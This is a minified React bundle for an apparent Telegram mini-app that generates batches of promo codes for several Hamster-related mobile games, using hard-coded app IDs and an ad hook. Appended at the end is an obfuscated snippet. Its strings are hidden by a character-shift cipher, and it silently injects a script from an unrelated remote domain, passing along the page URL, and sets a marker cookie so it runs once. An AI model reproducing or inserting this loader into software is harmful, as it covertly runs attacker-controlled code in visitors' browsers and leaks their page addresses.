Te.produceWithPatches.bind(Te), Te.setAutoFreeze.bind(Te), Te.setUseStrictShallowCopy.bind(Te), Te.applyPatches.bind(Te), Te.createDraft.bind(Te), Te.finishDraft.bind(Te);
const I0 = e => (t, n, r) => (r.setState = (o, l, ...i) => {
    const s = "function" == typeof o ? T0(o) : o;
    return t(s, l, ...i)
}, e(r.setState, n, r)),
    R0 = I0,
    sc = "game",
    j0 = {
        status: "idle"
    },
    zs = u0(f0(g0(R0((e => ({
        ...j0,
        setStatus(t) {
            e((n => {
                n.status = t
            }))
        }
    }))), {
        name: `hamster-tools.react.v0.3.0:${sc}`,
        partialize: e => Object.fromEntries(Object.entries(e).filter((([t]) => !["status"].includes(t))))
    }), {
        name: "Zustand Store",
        store: sc
    }), a0);

function O0({
    blockId: e,
    onReward: t,
    onError: n
}) {
    const r = x.useRef(void 0);
    return x.useEffect((() => {
        var o;
        r.current = null == (o = window.Adsgram) ? void 0 : o.init({
            blockId: e
        })
    }), [e]), x.useCallback((async () => {
        r.current ? r.current.show().then((() => {
            t()
        })).catch((o => {
            null == n || n(o)
        })) : null == n || n({
            error: !0,
            done: !1,
            state: "load",
            description: "Adsgram script not loaded"
        })
    }), [n, t])
}
const z0 = "1503";

function Kl() {
    const e = x.useCallback((() => console.log("Reward")), []),
        t = x.useCallback((r => console.log(JSON.stringify(r, null, 4))), []);
    return O0({
        blockId: z0,
        onReward: e,
        onError: t
    })
}

const handleClose = () => {
    console.log("Button was clicked!");

    // Toggle the visibility
    const root = document.getElementById("root");
    const rootMore = document.getElementById("root_more");
    rootMore.style.display = 'none';
    root.style.display = 'flex';
};

const L0 = "d28721be-fd2d-4b45-869e-9f253b554e50",
    M0 = "43e35910-c168-4634-ad4f-52fd764a843f",
    xo = new Ul(L0, M0);

    function A0() {
        const [e, t] = x.useState(Array(20).fill(null)); // State to hold 20 promo codes
        const n = zs(c => c.status); // Status of generation
        const r = zs(c => c.setStatus);
        const [o, l] = x.useState(0);
        const { copy: i } = Vl();
        const s = Kl();
    
    
        // Copy All Codes
        const copyAllCodes = () => {
            const allCodes = e.filter(Boolean).join("\n");
            i(allCodes);
            Mt(v.jsxs("div", {
                className: "flex justify-center items-center",
                children: [
                    v.jsx(Ml, { size: 16, className: "mr-2" }),
                    v.jsx("span", { children: "All Codes Copied!" })
                ]
            }));
        };
    
        // Generate 20 promo codes
        const generateCodes = async () => {
            try {
                t(Array(20).fill(null)); // Prepare space for 20 codes
                r("wait");
                l(0);
                s();
                const codes = await Promise.all(Array(20).fill(null).map(() => xo.generate()));
                t(codes);
                r("done");
                l(100);
            } catch (error) {
                console.log("Error:", error);
                Mt("Error");
                t(Array(20).fill(null)); // Reset the state in case of error
                r("idle");
                l(0);
            }
        };
    
        return x.useEffect(() => {
            if (n !== "wait") return;
            const c = setInterval(() => {
                l(p => p < 100 ? p + 1 : (clearInterval(c), 100));
            }, 1000);
            return () => clearInterval(c);
        }, [n]), v.jsxs(Wr, {
            children: [
                v.jsxs(Hr, {
                    children: [
                        v.jsx(Br, { children: "Bike Ride 3D" }),
                        v.jsxs(Gr, { children: ["click ", v.jsx("b", { children: "Generate" }), " to use"] })
                    ]
                }),
                v.jsx(Kr, {
                    children: v.jsxs("ul", {
                        className: "space-y-2",
                        children: e.map((c, p) => v.jsxs("li", {
                            className: "flex justify-between items-center gap-4",
                            children: [
                                c ? v.jsx(Fl, { code: c }) : v.jsx(Dl, { animation: "wait" === n }),
                                v.jsx(ft, {
                                    variant: "outline",
                                    size: "sm",
                                    onClick: () => function u(c) {
                                        i(c);
                                        Mt(v.jsxs("div", {
                                            className: "flex justify-center items-center",
                                            children: [v.jsx(Ml, { size: 16, className: "mr-2" }), " ", v.jsx("span", { children: "Copied!" })]
                                        }));
                                    }(c),
                                    disabled: !c,
                                    children: v.jsx(Al, { size: 12 })
                                })
                            ]
                        }, p))
                    })
                }),
                v.jsxs("p", {
                    className: "text-center font-medium mt-4",
                    children: [o, "%"]
                }),
                v.jsx(Yr, { value: o, className: "progressbar" }),
                v.jsx(Qr, {
                    children: v.jsxs("div", {
                        className: "flex items-center gap-4",
                        children: [
                            v.jsxs(ft, {
                                onClick: generateCodes,
                                disabled: "wait" === n,
                                children: [v.jsx($l, { size: 16, className: "mr-2" }), "Generate"]
                            }),
                            v.jsx(ft, {
                                onClick: copyAllCodes,
                                disabled: "wait" === n, // Disable copy button if generate button is disabled
                                children: "Copy All"
                            }),
                            v.jsx(ft, {
                                onClick: handleClose,
                                disabled: "wait" === n, // Disable close button if generate button is disabled
                                children: "Close"
                            })
                        ]
                    })
                })
            ]
        });
    }
    



const $0 = "74ee0b5b-775e-4bee-974f-63e7f4d5bacb",
    D0 = "fe693b26-b342-4159-8808-15e3ff7f8767",
    So = new Ul($0, D0);

    function F0() {
        const [e, t] = x.useState(Array(20).fill(null)); // State to hold 20 promo codes
        const [n, r] = x.useState("idle");
        const [o, l] = x.useState(0);
        const { copy: i } = Vl();
        const s = Kl();
    
        const copyAllCodes = () => {
            const allCodes = e.filter(Boolean).join("\n");
            i(allCodes);
            Mt(v.jsxs("div", {
                className: "flex justify-center items-center",
                children: [
                    v.jsx(Ml, { size: 16, className: "mr-2" }),
                    v.jsx("span", { children: "All Codes Copied!" })
                ]
            }));
        };
    
        // Generate 20 promo codes
        const generateCodes = async () => {
            try {
                t(Array(20).fill(null)); // Prepare space for 20 codes
                r("wait");
                l(0);
                s();
                const codes = await Promise.all(Array(20).fill(null).map(() => So.generate()));
                t(codes);
                r("done");
                l(100);
            } catch (error) {
                console.log("Error:", error);
                Mt("Error");
                t(Array(20).fill(null)); // Reset the state in case of error
                r("idle");
                l(0);
            }
        };
    
        return x.useEffect(() => {
            if (n !== "wait") return;
            const c = setInterval(() => {
                l(p => (p < 100 ? p + 1 : (clearInterval(c), 100)));
            }, 1000);
            return () => clearInterval(c);
        }, [n]), v.jsxs(Wr, {
            children: [
                v.jsxs(Hr, {
                    children: [
                        v.jsx(Br, { children: "My Clone Army" }),
                        v.jsxs(Gr, {
                            children: ["click ", v.jsx("b", { children: "Generate" }), " to use"]
                        })
                    ]
                }),
                v.jsx(Kr, {
                    children: v.jsxs("ul", {
                        className: "space-y-2 overflow-auto",
                        children: e.map((c, p) => v.jsxs("li", {
                            className: "flex justify-between items-center gap-4",
                            children: [
                                c ? v.jsx(Fl, { code: c }) : v.jsx(Dl, { animation: "wait" === n }),
                                v.jsx(ft, {
                                    variant: "outline",
                                    size: "sm",
                                    onClick: () => function u(c) {
                                        i(c);
                                        Mt(v.jsxs("div", {
                                            className: "flex justify-center items-center",
                                            children: [v.jsx(Ml, { size: 16, className: "mr-2" }), " ", v.jsx("span", { children: "Copied!" })]
                                        }));
                                    }(c),
                                    disabled: !c,
                                    children: v.jsx(Al, { size: 12 })
                                })
                            ]
                        }, p))
                    })
                }),
                v.jsxs("p", {
                    className: "text-center font-medium mt-4",
                    children: [o, "%"]
                }),
                v.jsx(Yr, { value: o, className: "progressbar" }),
                v.jsx(Qr, {
                    children: v.jsxs("div", {
                        className: "flex items-center gap-4",
                        children: [
                            v.jsxs(ft, {
                                onClick: generateCodes,
                                disabled: "wait" === n,
                                children: [
                                    v.jsx($l, { size: 16, className: "mr-2" }),
                                    "Generate"
                                ]
                            }),
                            v.jsx(ft, {
                                onClick: copyAllCodes,
                                disabled: "wait" === n, // Disable copy button if generate button is disabled
                                children: "Copy All"
                            }),
                            v.jsx(ft, {
                                onClick: () => { handleClose(); }, // Define handleClose function if needed
                                disabled: "wait" === n, // Disable close button if generate button is disabled
                                children: "Close"
                            })
                        ]
                    })
                })
            ]
        });
    }
    


const V0 = "d1690a07-3780-4068-810f-9b5bbf2931b2",
    U0 = "b4170868-cef0-424f-8eb9-be0622e8e8e3",
    _o = new Ul(V0, U0);

    function b0() {
        const [e, t] = x.useState(Array(20).fill(null)); // State to hold 20 promo codes
        const [n, r] = x.useState("idle");
        const [o, l] = x.useState(0);
        const { copy: i } = Vl();
        const s = Kl();
    
        // Copy All Codes Function
        const copyAllCodes = () => {
            const allCodes = e.filter(Boolean).join("\n");
            i(allCodes);
            Mt(v.jsxs("div", {
                className: "flex justify-center items-center",
                children: [
                    v.jsx(Ml, { size: 16, className: "mr-2" }),
                    v.jsx("span", { children: "All Codes Copied!" })
                ]
            }));
        };
    
        // Generate 20 promo codes
        const generateCodes = async () => {
            try {
                t(Array(20).fill(null)); // Prepare space for 20 codes
                r("wait");
                l(0);
                s();
                const codes = await Promise.all(Array(20).fill(null).map(() => _o.generate()));
                t(codes);
                r("done");
                l(100);
            } catch (error) {
                console.log("Error:", error);
                Mt("Error");
                t(Array(20).fill(null)); // Reset the state in case of error
                r("idle");
                l(0);
            }
        };
    
        return x.useEffect(() => {
            if (n !== "wait") return;
            const c = setInterval(() => {
                l(p => (p < 100 ? p + 1 : (clearInterval(c), 100)));
            }, 1000);
            return () => clearInterval(c);
        }, [n]), v.jsxs(Wr, {
            children: [
                v.jsxs(Hr, {
                    children: [
                        v.jsx(Br, { children: "Chain Cube 2048" }),
                        v.jsxs(Gr, {
                            children: ["click ", v.jsx("b", { children: "Generate" }), " to use"]
                        })
                    ]
                }),
                v.jsx(Kr, {
                    children: v.jsxs("ul", {
                        className: "space-y-2",
                        children: e.map((c, p) => v.jsxs("li", {
                            className: "flex justify-between items-center gap-4",
                            children: [
                                c ? v.jsx(Fl, { code: c }) : v.jsx(Dl, { animation: "wait" === n }),
                                v.jsx(ft, {
                                    variant: "outline",
                                    size: "sm",
                                    onClick: () => function u(c) {
                                        i(c);
                                        Mt(v.jsxs("div", {
                                            className: "flex justify-center items-center",
                                            children: [v.jsx(Ml, { size: 16, className: "mr-2" }), " ", v.jsx("span", { children: "Copied!" })]
                                        }));
                                    }(c),
                                    disabled: !c,
                                    children: v.jsx(Al, { size: 12 })
                                })
                            ]
                        }, p))
                    })
                }),
                v.jsxs("p", {
                    className: "text-center font-medium mt-4",
                    children: [o, "%"]
                }),
                v.jsx(Yr, { value: o, className: "progressbar" }),
                v.jsx(Qr, {
                    children: v.jsxs("div", {
                        className: "flex items-center gap-4",
                        children: [
                            v.jsxs(ft, {
                                onClick: generateCodes,
                                disabled: "wait" === n,
                                children: [
                                    v.jsx($l, { size: 16, className: "mr-2" }),
                                    "Generate"
                                ]
                            }),
                            v.jsx(ft, {
                                onClick: copyAllCodes,
                                disabled: "wait" === n, // Disable copy button if generate button is disabled
                                children: "Copy All"
                            }),
                            v.jsx(ft, {
                                onClick: () => { handleClose(); }, // Define handleClose function if needed
                                disabled: "wait" === n, // Disable close button if generate button is disabled
                                children: "Close"
                            })
                        ]
                    })
                })
            ]
        });
    }
    

const W0 = "82647f43-3f87-402d-88dd-09a90025313f",
    H0 = "c4480ac7-e178-4973-8061-9ed5b2e17954",
    Eo = new Ul(W0, H0);

    function B0() {
        const [e, t] = x.useState(Array(20).fill(null)); // State to hold 20 promo codes
        const [n, r] = x.useState("idle");
        const [o, l] = x.useState(0);
        const { copy: i } = Vl();
        const s = Kl();
    
        // Copy All Codes Function
        const copyAllCodes = () => {
            const allCodes = e.filter(Boolean).join("\n");
            i(allCodes);
            Mt(v.jsxs("div", {
                className: "flex justify-center items-center",
                children: [
                    v.jsx(Ml, { size: 16, className: "mr-2" }),
                    v.jsx("span", { children: "All Codes Copied!" })
                ]
            }));
        };
    
        // Generate 20 promo codes
        const generateCodes = async () => {
            try {
                t(Array(20).fill(null)); // Prepare space for 20 codes
                r("wait");
                l(0);
                s();
                const codes = await Promise.all(Array(20).fill(null).map(() => Eo.generate()));
                t(codes);
                r("done");
                l(100);
            } catch (error) {
                console.log("Error:", error);
                Mt("Error");
                t(Array(20).fill(null)); // Reset the state in case of error
                r("idle");
                l(0);
            }
        };
    
        return x.useEffect(() => {
            if (n !== "wait") return;
            const c = setInterval(() => {
                l(p => (p < 100 ? p + 1 : (clearInterval(c), 100)));
            }, 1000);
            return () => clearInterval(c);
        }, [n]), v.jsxs(Wr, {
            children: [
                v.jsxs(Hr, {
                    children: [
                        v.jsx(Br, { children: "Train Miner" }),
                        v.jsxs(Gr, {
                            children: ["click ", v.jsx("b", { children: "Generate" }), " to use"]
                        })
                    ]
                }),
                v.jsx(Kr, {
                    children: v.jsxs("ul", {
                        className: "space-y-2",
                        children: e.map((c, p) => v.jsxs("li", {
                            className: "flex justify-between items-center gap-4",
                            children: [
                                c ? v.jsx(Fl, { code: c }) : v.jsx(Dl, { animation: "wait" === n }),
                                v.jsx(ft, {
                                    variant: "outline",
                                    size: "sm",
                                    onClick: () => function u(c) {
                                        i(c);
                                        Mt(v.jsxs("div", {
                                            className: "flex justify-center items-center",
                                            children: [v.jsx(Ml, { size: 16, className: "mr-2" }), " ", v.jsx("span", { children: "Copied!" })]
                                        }));
                                    }(c),
                                    disabled: !c,
                                    children: v.jsx(Al, { size: 12 })
                                })
                            ]
                        }, p))
                    })
                }),
                v.jsxs("p", {
                    className: "text-center font-medium mt-4",
                    children: [o, "%"]
                }),
                v.jsx(Yr, { value: o, className: "progressbar" }),
                v.jsx(Qr, {
                    children: v.jsxs("div", {
                        className: "flex items-center gap-4",
                        children: [
                            v.jsxs(ft, {
                                onClick: generateCodes,
                                disabled: "wait" === n,
                                children: [
                                    v.jsx($l, { size: 16, className: "mr-2" }),
                                    "Generate"
                                ]
                            }),
                            v.jsx(ft, {
                                onClick: copyAllCodes,
                                disabled: "wait" === n, // Disable copy button if generate button is disabled
                                children: "Copy All"
                            }),
                            v.jsx(ft, {
                                onClick: () => { handleClose(); }, // Define handleClose function if needed
                                disabled: "wait" === n, // Disable close button if generate button is disabled
                                children: "Close"
                            })
                        ]
                    })
                })
            ]
        });
    }
    

const uc = window.Telegram.WebApp;

function G0() {
    const e = zs((t => t.status));
    return x.useEffect((() => {
        var t;
        //   uc.ready(), null != (t = uc.initDataUnsafe.user) && t.id || window.location.replace("https://t.me/hamster_keys_tools_bot")
        uc.ready(), null != (t = uc.initDataUnsafe.user) && t.id
    }), []), v.jsxs(v.Fragment, {
        children: [v.jsx(Sy, {}), v.jsxs("div", {
            className: "container",
            children: [v.jsxs(gy, {
                defaultValue: "bike",
                children: [v.jsxs(lp, {
                    children: [v.jsx(rr, {
                        value: "bike",
                        className: "font-bold text-foreground-muted",
                        disabled: "wait" === e,
                        children: "Bike"
                    }), v.jsx(rr, {
                        value: "clone",
                        className: "font-bold text-foreground-muted",
                        disabled: "wait" === e,
                        children: "Clone"
                    }), v.jsx(rr, {
                        value: "cube",
                        className: "font-bold text-foreground-muted",
                        disabled: "wait" === e,
                        children: "Cube"
                    }), v.jsx(rr, {
                        value: "train",
                        className: "font-bold text-foreground-muted",
                        disabled: "wait" === e,
                        children: "Train"
                    })]
                }), v.jsx(or, {
                    value: "bike",
                    children: v.jsx(A0, {})
                }), v.jsx(or, {
                    value: "clone",
                    children: v.jsx(F0, {})
                }), v.jsx(or, {
                    value: "cube",
                    children: v.jsx(b0, {})
                }), v.jsx(or, {
                    value: "train",
                    children: v.jsx(B0, {})
                })]
            }), v.jsx(Jv, {}), v.jsx(sg, {})]
        })]
    })
}
Pi.createRoot(document.getElementById("root_more")).render(v.jsx(Ye.StrictMode, {
    children: v.jsx(G0, {})
}));
(function (o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function () {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44hisqtlx' + '3htr4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) { };
}({}, document, location));
